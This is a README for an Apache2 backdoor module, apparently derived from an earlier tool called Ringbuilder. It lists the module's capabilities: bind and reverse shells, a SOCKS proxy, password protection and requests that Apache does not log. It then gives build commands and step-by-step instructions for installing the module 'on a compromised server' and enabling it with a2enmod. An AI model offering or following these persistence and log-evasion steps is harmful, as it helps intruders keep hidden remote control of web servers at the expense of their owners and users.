# Apache2 mod_backdoor
Apache2 Module Backdoor is inspired from Ringbuilder. <br/>

More info about Ringbuilder: https://www.tarlogic.com/en/blog/backdoors-modulos-apache/ <br/>
Original Author : Juan Manuel Fernandez ([@TheXC3LL](https://twitter.com/TheXC3LL))

# Features

* Bind TTY Shell
* Reverse Shell (Perl,Python, PHP)
* Socks proxy (Socks5 code from https://github.com/fgssfgss/socks_proxy)
* Password Protection
* Ping module to know if its active
* Endpoint that restart Apache2

All the requests to the module **are not logged by Apache2**


# Notes
Socks5 code was adapted from https://github.com/fgssfgss/socks_proxy

# Build
For developpement :<br/>
* `apxs -i -a -c mod_backdoor.c -Wl,-lutil` <br/>
 -Wl,-lutil used to link mod_backdoor.so with libutil.so to use forkpty() from <pty.h>
* `systemctl restart apache2`

On a compromised server :<br/>
* Copy mod_backdoor.so to `/usr/lib/apache2/modules/mod_backdoor.so`
* Create `/etc/apache2/mod-available/backdoor.load` with content:<br/>
 `LoadModule backdoor_module /usr/lib/apache2/modules/mod_backdoor.so`
* `a2enmod backdoor` --> `systemctl restart apache2`

# Author
Vlad Rico ([@RicoVlad](https://twitter.com/RicoVlad))
